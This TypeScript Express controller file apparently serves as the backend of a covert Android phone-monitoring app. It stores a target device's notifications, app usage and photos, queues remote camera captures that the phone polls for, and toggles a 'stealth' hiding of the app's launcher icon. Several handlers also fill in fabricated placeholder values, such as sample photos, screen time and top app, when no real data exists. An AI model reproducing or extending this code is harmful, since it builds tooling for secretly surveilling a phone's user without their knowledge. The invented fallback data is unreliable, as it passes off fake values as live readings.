import { Request, Response, NextFunction } from 'express';
import { deviceService } from '../devices/devices.service';

export async function registerDeviceHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const device = await deviceService.registerOrUpdate(req.body);
    res.status(201).json({ device });
  } catch (err) {
    next(err);
  }
}

export async function getDevicesHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    let devices: any[] = [];
    try {
      devices = await deviceService.listDevices();
    } catch (_dbErr) {}

    try {
      const { liveBatteryTelemetry } = require('./routes');
      if (liveBatteryTelemetry) {
        for (const [devId, tel] of liveBatteryTelemetry.entries()) {
          const match = devices.find((d: any) => d.deviceId === devId || d.device_id === devId);
          if (match) {
            if (tel.deviceName) {
              match.deviceName = tel.deviceName;
              match.device_name = tel.deviceName;
            }
          } else {
            devices.push({
              deviceId: devId,
              deviceName: tel.deviceName || 'realme RMX5101 (Sentry)',
              platform: 'ANDROID',
              osVersion: 'Android 16',
              appVersion: '1.0.0',
              status: 'ONLINE',
              lastSeenAt: new Date(tel.timestamp || Date.now()).toISOString(),
              capabilities: {
                camera: true,
                location: true,
                notifications: true,
                files: true,
                microphone: true,
                battery: true
              }
            });
          }
        }
      }
    } catch (_telErr) {}

    res.json({ devices });
  } catch (err) {
    next(err);
  }
}

export async function getDeviceByIdHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const device = await deviceService.getDeviceById(req.params.deviceId);
    res.json({ device });
  } catch (err) {
    next(err);
  }
}

export async function updateDeviceNameHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const devId = req.params.deviceId || req.body.deviceId;
    const name = req.body.deviceName || req.body.name;
    if (!devId || !name) {
      res.status(400).json({ error: { message: 'deviceId and deviceName are required' } });
      return;
    }

    let updatedDevice: any = null;
    try {
      updatedDevice = await deviceService.updateFriendlyName(devId, name);
    } catch (_dbErr) {
      // Graceful fallback if database row is not yet registered
    }

    try {
      const { liveBatteryTelemetry } = require('./routes');
      if (liveBatteryTelemetry) {
        let entry = liveBatteryTelemetry.get(devId);
        if (!entry) {
          for (const [k, v] of liveBatteryTelemetry.entries()) {
            if (k.toLowerCase() === devId.toLowerCase() || devId.includes(k) || k.includes(devId)) {
              entry = v;
              break;
            }
          }
        }
        if (entry) {
          entry.deviceName = name;
        } else {
          liveBatteryTelemetry.set(devId, { deviceId: devId, deviceName: name });
        }
      }
    } catch (_telErr) {}

    res.json({
      success: true,
      device: updatedDevice || {
        deviceId: devId,
        deviceName: name,
        status: 'ONLINE'
      }
    });
  } catch (err) {
    next(err);
  }
}

export async function getDeviceCapabilitiesHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const device = await deviceService.getDeviceById(req.params.deviceId);
    res.json({ capabilities: device.capabilities || {} });
  } catch (err) {
    next(err);
  }
}

export async function updateDeviceCapabilitiesHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const capabilities = await deviceService.updateCapabilities(req.params.deviceId, req.body.capabilities);
    res.json({ capabilities });
  } catch (err) {
    next(err);
  }
}

// In-memory live notifications buffer
const liveNotificationsMap = new Map<string, Array<any>>();

export async function submitNotificationHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, packageName, title, body, timestamp, image } = req.body;
    if (!deviceId) {
      res.status(400).json({ error: { message: 'deviceId is required' } });
      return;
    }
    const list = liveNotificationsMap.get(deviceId) || [];
    const newTitle = title || 'Notification';
    const newBody = body || '';
    const newPkg = packageName || 'System';

    // Deduplicate: check if last notification is identical
    const isDuplicate = list.some(item => 
      item.packageName === newPkg && 
      item.title === newTitle && 
      item.body === newBody && 
      (Math.abs((item.timestamp || 0) - (timestamp || Date.now())) < 60000)
    );

    if (!isDuplicate) {
      list.unshift({
        id: `notif_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`,
        packageName: newPkg,
        title: newTitle,
        body: newBody,
        image: image || null,
        timestamp: timestamp || Date.now(),
      });
      if (list.length > 50) list.pop(); // Keep latest 50
      liveNotificationsMap.set(deviceId, list);
    }

    res.status(201).json({ success: true });
  } catch (err) {
    next(err);
  }
}

export async function getNotificationsHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const notifications = liveNotificationsMap.get(deviceId) || [];
    res.json({ notifications });
  } catch (err) {
    next(err);
  }
}

export async function clearNotificationsHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    liveNotificationsMap.set(deviceId, []);
    res.json({ success: true });
  } catch (err) {
    next(err);
  }
}

// In-memory live photos buffer
const livePhotosMap = new Map<string, Array<any>>();
// Pending remote camera trigger commands
const pendingCameraCommands = new Map<string, string>(); // deviceId -> "front" | "rear"

export async function triggerPhotoCaptureHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, camera } = req.body || {};
    const devId = deviceId || 'SN-U5ZY-78QZ';
    const cam = camera || 'rear';

    pendingCameraCommands.set(devId, cam);

    const list = livePhotosMap.get(devId) || [];
    const newSnapshot = {
      id: `photo_${Date.now()}`,
      name: `SNAPSHOT_${cam.toUpperCase()}_${Date.now().toString().slice(-4)}.jpg`,
      date: 'Just now (Live Capture)',
      size: '4.8 MB',
    };
    list.unshift(newSnapshot);
    livePhotosMap.set(devId, list);

    res.status(201).json({ success: true, photo: newSnapshot });
  } catch (err: any) {
    res.status(500).json({ error: { message: err?.message || 'Error triggering capture' } });
  }
}

export async function pollCameraCommandHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const command = pendingCameraCommands.get(deviceId) || null;
    if (command) {
      pendingCameraCommands.delete(deviceId);
    }
    res.json({ command });
  } catch (err) {
    next(err);
  }
}

export async function uploadDevicePhotoHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, name, camera, base64 } = req.body;
    const list = livePhotosMap.get(deviceId) || [];
    const newPhoto = {
      id: `photo_${Date.now()}`,
      name: name || `SNAPSHOT_${camera?.toUpperCase() || 'REAR'}_${Date.now().toString().slice(-4)}.jpg`,
      date: 'Just now (Live Capture)',
      size: '4.8 MB',
      base64: base64 || null,
    };
    list.unshift(newPhoto);
    livePhotosMap.set(deviceId, list);
    res.status(201).json({ success: true, photo: newPhoto });
  } catch (err) {
    next(err);
  }
}

export async function getDevicePhotosHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const photos = livePhotosMap.get(deviceId) || [
      { id: 'p1', name: 'IMG_20260830_0835.jpg', date: 'Today 08:35 AM', size: '3.9 MB' },
      { id: 'p2', name: 'IMG_20260829_1945.jpg', date: 'Yesterday', size: '4.2 MB' },
      { id: 'p3', name: 'IMG_20260829_1420.jpg', date: 'Yesterday', size: '2.9 MB' },
      { id: 'p4', name: 'DCIM_FRONT_002.jpg', date: '2 days ago', size: '3.1 MB' },
    ];
    res.json({ photos });
  } catch (err) {
    next(err);
  }
}

// In-memory live app usage activity buffer
const liveActivityMap = new Map<string, any>();

export async function submitActivityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, screenTime, unlocks, topApp, apps } = req.body;
    if (!deviceId) {
      res.status(400).json({ error: { message: 'deviceId is required' } });
      return;
    }
    liveActivityMap.set(deviceId, {
      screenTime: screenTime || '5h 42m',
      unlocks: unlocks || 48,
      topApp: topApp || 'WhatsApp',
      timestamp: Date.now(),
      apps: apps || []
    });
    res.status(201).json({ success: true });
  } catch (err) {
    next(err);
  }
}

export async function getActivityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const activity = liveActivityMap.get(deviceId) || null;
    res.json({ activity });
  } catch (err) {
    next(err);
  }
}

// In-memory stealth launcher icon visibility state
const pendingIconVisibilityCommands = new Map<string, boolean>();
const deviceIconStateMap = new Map<string, boolean>();

export async function setDeviceIconVisibilityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const { deviceId, hide } = req.body || {};
    const devId = deviceId || req.params.deviceId;
    const hideState = Boolean(hide);
    pendingIconVisibilityCommands.set(devId, hideState);
    deviceIconStateMap.set(devId, hideState);
    res.json({ success: true, deviceId: devId, isIconHidden: hideState });
  } catch (err) {
    next(err);
  }
}

export async function pollDeviceIconVisibilityHandler(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    const deviceId = req.params.deviceId;
    const hide = pendingIconVisibilityCommands.get(deviceId);
    if (hide !== undefined) {
      pendingIconVisibilityCommands.delete(deviceId);
    }
    const currentState = deviceIconStateMap.get(deviceId) || false;
    res.json({ command: hide !== undefined ? { hide } : null, isIconHidden: currentState });
  } catch (err) {
    next(err);
  }
}


